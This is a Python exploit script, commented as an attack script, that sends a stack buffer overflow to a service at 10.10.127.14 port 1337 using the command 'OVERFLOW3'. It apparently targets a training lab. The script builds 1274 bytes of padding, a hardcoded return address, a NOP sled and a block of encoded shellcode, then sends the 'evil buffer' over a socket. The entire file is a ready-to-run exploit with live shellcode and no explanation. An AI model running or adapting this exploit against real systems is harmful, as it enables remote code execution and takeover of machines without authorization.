#coding=utf-8
#!/usr/bin/python

#攻击脚本

import socket

ip = "10.10.127.14"
port = 1337

prefix = "OVERFLOW3 "
offset = 1274 
overflow = "A" * offset
retn = "\x03\x12\x50\x62"

padding = "\x90" * 16

buf = ""
buf+="\xfc\xbb\x2b\xdf\x28\xa1\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
buf+="\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xd7\x37\xaa\xa1\x27"
buf+="\xc8\xcb\x28\xc2\xf9\xcb\x4f\x87\xaa\xfb\x04\xc5\x46\x77\x48"
buf+="\xfd\xdd\xf5\x45\xf2\x56\xb3\xb3\x3d\x66\xe8\x80\x5c\xe4\xf3"
buf+="\xd4\xbe\xd5\x3b\x29\xbf\x12\x21\xc0\xed\xcb\x2d\x77\x01\x7f"
buf+="\x7b\x44\xaa\x33\x6d\xcc\x4f\x83\x8c\xfd\xde\x9f\xd6\xdd\xe1"
buf+="\x4c\x63\x54\xf9\x91\x4e\x2e\x72\x61\x24\xb1\x52\xbb\xc5\x1e"
buf+="\x9b\x73\x34\x5e\xdc\xb4\xa7\x15\x14\xc7\x5a\x2e\xe3\xb5\x80"
buf+="\xbb\xf7\x1e\x42\x1b\xd3\x9f\x87\xfa\x90\xac\x6c\x88\xfe\xb0"
buf+="\x73\x5d\x75\xcc\xf8\x60\x59\x44\xba\x46\x7d\x0c\x18\xe6\x24"
buf+="\xe8\xcf\x17\x36\x53\xaf\xbd\x3d\x7e\xa4\xcf\x1c\x17\x09\xe2"
buf+="\x9e\xe7\x05\x75\xed\xd5\x8a\x2d\x79\x56\x42\xe8\x7e\x99\x79"
buf+="\x4c\x10\x64\x82\xad\x39\xa3\xd6\xfd\x51\x02\x57\x96\xa1\xab"
buf+="\x82\x39\xf1\x03\x7d\xfa\xa1\xe3\x2d\x92\xab\xeb\x12\x82\xd4"
buf+="\x21\x3b\x29\x2f\xa2\x4e\xbf\x26\xe8\x27\xbd\x38\x1d\xe4\x48"
buf+="\xde\x77\x04\x1d\x49\xe0\xbd\x04\x01\x91\x42\x93\x6c\x91\xc9"
buf+="\x10\x91\x5c\x3a\x5c\x81\x09\xca\x2b\xfb\x9c\xd5\x81\x93\x43"
buf+="\x47\x4e\x63\x0d\x74\xd9\x34\x5a\x4a\x10\xd0\x76\xf5\x8a\xc6"
buf+="\x8a\x63\xf4\x42\x51\x50\xfb\x4b\x14\xec\xdf\x5b\xe0\xed\x5b"
buf+="\x0f\xbc\xbb\x35\xf9\x7a\x12\xf4\x53\xd5\xc9\x5e\x33\xa0\x21"
buf+="\x61\x45\xad\x6f\x17\xa9\x1c\xc6\x6e\xd6\x91\x8e\x66\xaf\xcf"
buf+="\x2e\x88\x7a\x54\x4e\x6b\xae\xa1\xe7\x32\x3b\x08\x6a\xc5\x96"
buf+="\x4f\x93\x46\x12\x30\x60\x56\x57\x35\x2c\xd0\x84\x47\x3d\xb5"
buf+="\xaa\xf4\x3e\x9c\xaa\xfa\xc0\x1f"

payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


